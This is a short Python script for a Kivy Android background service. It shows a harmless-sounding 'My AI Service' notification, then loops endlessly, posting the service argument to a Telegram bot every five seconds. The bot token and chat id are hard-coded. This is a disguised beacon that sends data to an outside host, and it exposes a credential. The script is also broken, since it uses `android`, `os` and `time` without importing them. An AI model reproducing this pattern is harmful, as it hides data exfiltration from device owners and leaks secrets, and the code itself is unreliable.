import requests
from time import sleep
from jnius import autoclass

PythonService = autoclass('org.kivy.android.PythonService')
service = PythonService.mService

NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Context = autoclass('android.content.Context')

manager = service.getSystemService(Context.NOTIFICATION_SERVICE)

channel_id = "myservice"

if android.os.Build.VERSION.SDK_INT >= 26:
    channel = NotificationChannel(
        channel_id,
        "My Background Service",
        NotificationManager.IMPORTANCE_LOW
    )
    manager.createNotificationChannel(channel)

builder = NotificationBuilder(service, channel_id)

builder.setContentTitle("My AI Service")
builder.setContentText("Running in background")
builder.setSmallIcon(service.getApplicationInfo().icon)

notification = builder.build()

service.startForeground(1, notification)

while True:
    requests.post("https://api.telegram.org/bot8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI/sendMessage", data={'chat_id':'7589082187','text':os.environ.get('PYTHON_SERVICE_ARGUMENT','No argv Found')})
    time.sleep(5)